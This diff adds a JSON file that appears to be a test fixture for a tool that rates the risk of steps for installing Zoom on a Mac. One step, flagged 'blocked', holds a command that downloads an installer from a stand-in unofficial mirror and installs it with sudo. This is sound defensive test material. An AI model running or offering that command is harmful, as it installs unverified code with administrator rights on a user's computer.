@@ -1,0 +1,64 @@
+{
+  "goal": "Install Zoom",
+  "applies_to_this_computer": true,
+  "page_concerns": [
+    {
+      "concern": "Sends you to an unknown download site and installs with admin rights",
+      "steps": [
+        1
+      ]
+    }
+  ],
+  "steps": [
+    {
+      "title": "Download Zoom from an unofficial mirror",
+      "explanation": "Downloads an installer from a site that is not Zoom's own, then installs it with administrator rights. This is not recommended.",
+      "kind": "command",
+      "command": "curl -L -o ~/Downloads/Zoom.pkg http://zoom-download-mirror.invalid/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /",
+      "url": null,
+      "check_command": "test -d /Applications/zoom.us.app",
+      "click_target": null,
+      "settings_url": null,
+      "risk_opinion": "blocked",
+      "alternative_group": "A",
+      "alternative_option": 1,
+      "concerns": [
+        "Downloads from an unknown website, not Zoom's official site",
+        "Installs software using your Mac's administrator password",
+        "Runs an installer you cannot verify is safe"
+      ]
+    },
+    {
+      "title": "Install Zoom with Homebrew",
+      "explanation": "Installs the official Zoom app using Homebrew, a software installer already on this Mac. You may be asked for permission.",
+      "kind": "command",
+      "command": "brew install --cask zoom",
+      "url": null,
+      "check_command": "brew list --cask zoom",
+      "click_target": null,
+      "settings_url": null,
+      "risk_opinion": "ask",
+      "alternative_group": "A",
+      "alternative_option": 2,
+      "concerns": []
+    },
+    {
+      "title": "Open Zoom",
+      "explanation": "Open Zoom from your Applications folder so you are ready for the video call.",
+      "kind": "manual",
+      "command": null,
+      "url": null,
+      "check_command": null,
+      "click_target": "Zoom",
+      "settings_url": null,
+      "risk_opinion": "safe",
+      "alternative_group": null,
+      "alternative_option": null,
+      "concerns": []
+    }
+  ],
+  "finish_check": {
+    "command": "test -d /Applications/zoom.us.app",
+    "message": "Zoom is installed"
+  }
+}
